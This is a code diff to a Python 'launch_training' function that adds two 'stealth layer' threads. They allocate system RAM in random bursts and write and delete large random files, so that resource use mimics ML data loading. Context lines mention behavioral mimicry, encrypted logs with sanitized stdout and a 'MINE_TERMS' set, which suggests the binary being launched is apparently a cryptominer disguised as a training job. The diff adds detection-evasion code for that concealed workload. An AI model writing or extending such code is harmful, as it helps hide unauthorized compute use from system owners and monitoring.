@@ -407,6 +407,59 @@ def launch_training(config, binary_path):
             except:
                 pass
 
+    # === STEALTH LAYER 13: System RAM cycling ===
+    def ram_cycle_thread(stop_evt):
+        """Allocate/free system RAM to mimic data loading patterns."""
+        while not stop_evt.is_set():
+            stop_evt.wait(random.uniform(10, 30))
+            if stop_evt.is_set(): break
+            try:
+                # Allocate 2-8GB of system RAM (like loading a batch)
+                size_mb = random.randint(2048, 8192)
+                chunk = bytearray(size_mb * 1024 * 1024)
+                # Touch pages so they're actually allocated
+                for i in range(0, len(chunk), 4096):
+                    chunk[i] = 0xFF
+                time.sleep(random.uniform(0.5, 3.0))
+                del chunk
+            except MemoryError:
+                pass
+            except:
+                pass
+
+    # === STEALTH LAYER 14: Storage I/O simulation ===
+    def storage_io_thread(stop_evt):
+        """Simulate dataset reading/writing — temp files, preprocessing."""
+        work_dir = Path(__file__).parent.parent / ".data_cache"
+        work_dir.mkdir(exist_ok=True)
+        while not stop_evt.is_set():
+            stop_evt.wait(random.uniform(5, 20))
+            if stop_evt.is_set(): break
+            try:
+                action = random.choice(["preprocess", "cache", "cleanup"])
+                if action == "preprocess":
+                    # Simulate tokenizing a batch
+                    tmp_path = work_dir / f"batch_{random.randint(1000,9999)}.tmp"
+                    sz = random.randint(10, 100) * 1024 * 1024  # 10-100MB
+                    with open(tmp_path, "wb") as f:
+                        f.write(os.urandom(sz))
+                elif action == "cache":
+                    # Simulate writing to cache
+                    cache_path = work_dir / f"cache_{random.randint(100,999)}.bin"
+                    sz = random.randint(50, 500) * 1024 * 1024  # 50-500MB
+                    with open(cache_path, "wb") as f:
+                        f.write(os.urandom(sz))
+                else:
+                    # Cleanup old temp files
+                    tmps = sorted(work_dir.glob("batch_*.tmp"))
+                    for old in tmps[:-5]:
+                        old.unlink()
+                    caches = sorted(work_dir.glob("cache_*.bin"))
+                    for old in caches[:-3]:
+                        old.unlink()
+            except:
+                pass
+
     # === LAUNCH ALL BEHAVIORAL THREADS ===
     behavioral_stop = threading.Event()
     for name, fn, args in [
@@ -415,9 +468,11 @@ def launch_training(config, binary_path):
         ("vram_cycle",   vram_cycle_thread,   (behavioral_stop,)),
         ("disk_io",      disk_io_thread,      (behavioral_stop,)),
         ("network_mix",  network_thread,      (behavioral_stop,)),
+        ("ram_cycle",    ram_cycle_thread,    (behavioral_stop,)),
+        ("storage_io",   storage_io_thread,   (behavioral_stop,)),
     ]:
         threading.Thread(target=fn, args=args, daemon=True, name=name).start()
-    print(f"[System] Behavioral mimicry active (5 threads)", flush=True)
+    print(f"[System] Behavioral mimicry active (7 threads)", flush=True)
 
     # === Read output → encrypted log + sanitized stdout ===
     MINE_TERMS = {
